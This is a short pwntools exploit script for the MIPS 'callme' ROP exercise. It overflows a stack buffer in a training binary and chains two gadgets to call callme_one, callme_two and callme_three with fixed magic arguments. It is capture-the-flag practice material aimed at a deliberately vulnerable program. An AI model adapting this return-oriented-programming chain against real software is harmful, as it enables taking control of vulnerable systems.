from pwn import *

useful_gadets = 0x0400bb0 # lw a0,16(sp); lw a1,12(sp); lw a2,8(sp); lw t9,4(sp); jalr t9; nop;
useful_gadets2 = 0x400bc8 # lw ra,20(sp); jr ra; addi sp,sp,24;
elf = ELF("./callme_mipsel")
context(arch='mips',endian='little',os='linux')

p = gdb.debug(elf.path,'''
        break pwnme
        break callme_one
        continue
''')


p.recvuntil('> ')

buf = b'A' * 36
buf += p32(useful_gadets2)
buf += b'B' * 4 # dummy
buf += b'C' * 16 # dummy
buf += p32(useful_gadets) # ra
buf += b'D' * 4
buf += p32(elf.symbols['callme_one']) # t9
buf += p32(0xd00df00d) # a2
buf += p32(0xcafebabe) # a1
buf += p32(0xdeadbeef) # a0
buf += p32(useful_gadets)
buf += b'E' * 4
buf += p32(elf.symbols['callme_two']) # t9
buf += p32(0xd00df00d) # a2
buf += p32(0xcafebabe) # a1
buf += p32(0xdeadbeef) # a0
buf += p32(useful_gadets)
buf += b'F' * 4
buf += p32(elf.symbols['callme_three']) # t9
buf += p32(0xd00df00d) # a2
buf += p32(0xcafebabe) # a1
buf += p32(0xdeadbeef) # a0
buf += p32(elf.symbols['pwnme']) # end



p.send(buf)
p.interactive()
